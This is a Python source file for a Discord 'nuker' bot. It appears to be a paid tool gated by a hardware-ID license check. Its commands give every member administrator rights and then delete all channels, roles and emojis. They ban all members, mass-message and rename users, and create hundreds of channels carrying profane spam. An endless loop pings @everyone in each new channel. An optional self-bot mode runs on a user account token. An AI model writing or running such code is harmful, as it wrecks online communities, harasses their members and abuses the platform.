import discord
from discord.ext import commands
import random
import asyncio
from discord.ext import commands
import time
from discord import Permissions
from colorama import Fore, Style
import subprocess, requests, time, os
import auth

print ()
intents = discord.Intents.default()
intents.members = True
intents.messages = True
intents.presences = True

res = (auth.check())
print (res)
if res == 1:
    print ("verified")
else: 
    print("[ERROR] You gotta pay")
    print()
    print(f'Your HWID: {auth.hwid()}') 
    time.sleep(5)
    quit()


print(''' 


███╗░░░███╗░█████╗░██████╗░███████╗  ██████╗░██╗░░░██╗  ░░░░░░██╗███╗░░██╗░██████╗███████╗██████╗░████████╗
████╗░████║██╔══██╗██╔══██╗██╔════╝  ██╔══██╗╚██╗░██╔╝  ░░░░░░██║████╗░██║██╔════╝██╔════╝██╔══██╗╚══██╔══╝
██╔████╔██║███████║██║░░██║█████╗░░  ██████╦╝░╚████╔╝░  █████╗██║██╔██╗██║╚█████╗░█████╗░░██████╔╝░░░██║░░░
██║╚██╔╝██║██╔══██║██║░░██║██╔══╝░░  ██╔══██╗░░╚██╔╝░░  ╚════╝██║██║╚████║░╚═══██╗██╔══╝░░██╔══██╗░░░██║░░░
██║░╚═╝░██║██║░░██║██████╔╝███████╗  ██████╦╝░░░██║░░░  ░░░░░░██║██║░╚███║██████╔╝███████╗██║░░██║░░░██║░░░
╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═════╝░╚══════╝  ╚═════╝░░░░╚═╝░░░  ░░░░░░╚═╝╚═╝░░╚══╝╚═════╝░╚══════╝╚═╝░░╚═╝░░░╚═╝░░░

███╗░░██╗░█████╗░███╗░░░███╗███████╗  ██╗░░██╗███████╗██████╗░███████╗░░░░░░
████╗░██║██╔══██╗████╗░████║██╔════╝  ██║░░██║██╔════╝██╔══██╗██╔════╝░░░░░░
██╔██╗██║███████║██╔████╔██║█████╗░░  ███████║█████╗░░██████╔╝█████╗░░█████╗
██║╚████║██╔══██║██║╚██╔╝██║██╔══╝░░  ██╔══██║██╔══╝░░██╔══██╗██╔══╝░░╚════╝
██║░╚███║██║░░██║██║░╚═╝░██║███████╗  ██║░░██║███████╗██║░░██║███████╗░░░░░░
╚═╝░░╚══╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚══════╝  ╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝░░░░░░

░░░██╗░██╗░░█████╗░░█████╗░░█████╗░░░███╗░░
██████████╗██╔══██╗██╔══██╗██╔══██╗░████║░░
╚═██╔═██╔═╝██║░░██║██║░░██║██║░░██║██╔██║░░
██████████╗██║░░██║██║░░██║██║░░██║╚═╝██║░░
╚██╔═██╔══╝╚█████╔╝╚█████╔╝╚█████╔╝███████╗
░╚═╝░╚═╝░░░░╚════╝░░╚════╝░░╚════╝░╚══════╝
 ''')
time.sleep(1)
print()
print()
print("Remember to turn on all intents or script will not work")
time.sleep(1)
print()
print()
ques = int(input("User nuker 1 or Bot nuker 2"))
print()
Token = str(input("What is your bots token"))
wow = (auth.check2())
if wow == 1:
  print("""
██████╗░░█████╗░███╗░░██╗██╗████████╗  ░█████╗░██╗░░░░░████████╗███████╗██████╗░  ███╗░░░███╗██╗░░░██╗
██╔══██╗██╔══██╗████╗░██║╚█║╚══██╔══╝  ██╔══██╗██║░░░░░╚══██╔══╝██╔════╝██╔══██╗  ████╗░████║╚██╗░██╔╝
██║░░██║██║░░██║██╔██╗██║░╚╝░░░██║░░░  ███████║██║░░░░░░░░██║░░░█████╗░░██████╔╝  ██╔████╔██║░╚████╔╝░
██║░░██║██║░░██║██║╚████║░░░░░░██║░░░  ██╔══██║██║░░░░░░░░██║░░░██╔══╝░░██╔══██╗  ██║╚██╔╝██║░░╚██╔╝░░
██████╔╝╚█████╔╝██║░╚███║░░░░░░██║░░░  ██║░░██║███████╗░░░██║░░░███████╗██║░░██║  ██║░╚═╝░██║░░░██║░░░
╚═════╝░░╚════╝░╚═╝░░╚══╝░░░░░░╚═╝░░░  ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝  ╚═╝░░░░░╚═╝░░░╚═╝░░░

░█████╗░░█████╗░██████╗░███████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░╚═╝██║░░██║██║░░██║█████╗░░
██║░░██╗██║░░██║██║░░██║██╔══╝░░
╚█████╔╝╚█████╔╝██████╔╝███████╗
░╚════╝░░╚════╝░╚═════╝░╚══════╝""")
  quit()
client = commands.Bot(command_prefix="!",intents = intents)
if ques == 1:
  client = commands.Bot(command_prefix="!",intents = intents, self_bot = True)
else:
  client = commands.Bot(command_prefix="!",intents = intents)
allowed_mentions = discord.AllowedMentions(everyone = True)
SPAM_CHANNEL =  ["FUCKED" , "GET NUKED FUCKERS" , "FUCKER" ]  
SPAM_MESSAGE = ["FUCKERS GET DICKED ON" , "FUCKERS LMAOO", "YOU FUCKED UP",]





@client.event
async def on_ready():
   print("your bot is online")
   await client.change_presence(activity=discord.Game(name="not a nuker 3000"))

@client.command()
@commands.is_owner()
async def stop(ctx):
    print (Fore.GREEN + f"{client.user.name} has logged out successfully." + Fore.RESET)
    quit()
@client.command()
async def Obama(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
    except:
      print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
    for member in guild.members:
     try:
       await member.ban()
       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)
    for role in guild.roles:
     try:
       await role.delete()
       print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{role.name} Has not been deleted" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
      user = ban_entry.user
      try:
        await user.unban("Obama's Step Son#1557")
        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
    await guild.create_text_channel("nuker 3000")()
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 8, max_uses = 1)
        print(f"New Invite: {link}")
    amount = 500
    for i in range(amount):
       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"Nuked {guild.name} Successfully.")
    return

@client.command(pass_content=True)
async def ObamaSpam(ctx, spamy):
  loop = int(spamy)
  while loop >= 1:
    await ctx.send(random.choice(SPAM_MESSAGE))
    loop = loop - 1
@client.command(pass_context=True)
async def ObamaRename(ctx, rename_to):
    await ctx.message.delete()
    for member in list(client.get_all_members()):
        try:
            await member.edit(nick=rename_to)
            print (f"{member.name} has been renamed to {rename_to}")
        except:
            print (f"{member.name} has NOT been renamed")
        print("Action completed: Rename all")

@client.command(pass_context=True)
async def ObamaMessage(ctx):
    await ctx.message.delete()
    for member in list(client.get_all_members()):
        await asyncio.sleep(0)
        try:
            embed = discord.Embed(title="NUKED", description="Obama's Step Son ON TOP" , color=discord.Colour.purple())
            embed.set_thumbnail(url="https://tenor.com/view/destory-eexplode-nuke-gif-6073338")
            await asyncio.sleep(3) # This is a delay on the command so the bot doesn't get rate limited, if you remove this the bot might get banned or rate limited
            await member.send(embed=embed)
        except:
            pass
        print("Action completed: Message all")
        

@client.command(pass_context=True)
async def ObamaEmoji(ctx):
      for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print (f"{emoji.name} has been deleted")
        except:
            pass   

@client.command(pass_context=True)
async def ObamaRole(ctx):
  for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print (f"{role.name} has been deleted")
        except:
            pass          

@client.command(pass_context=True)
@commands.is_owner()
async def ObamaHelp(ctx):
    await ctx.message.delete()
    await asyncio.sleep(0)
    try:
            embed = discord.Embed(title="Made By -insert name here-", description="Commands: \n \n !ObamaEmoji (deletes all emojis) \n **!Obama (main command)** \n !ObamaMessage (messages everyone in the server)  \n !ObamaRole (deletes all roles) \n !ObamaRename (renames everyone to whatever you specify) " , color=discord.Colour.purple())
            embed.set_footer(text="Not a Nuker")
            await ctx.author.send(embed=embed)
            await ctx.send(embed=embed)
    except:
            pass


@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))
    await channel.send(content = "@everyone", allowed_mentions = allowed_mentions)

if ques == 1:
  client.run(f"{Token}", bot=False)
else:
  client.run(f"{Token}")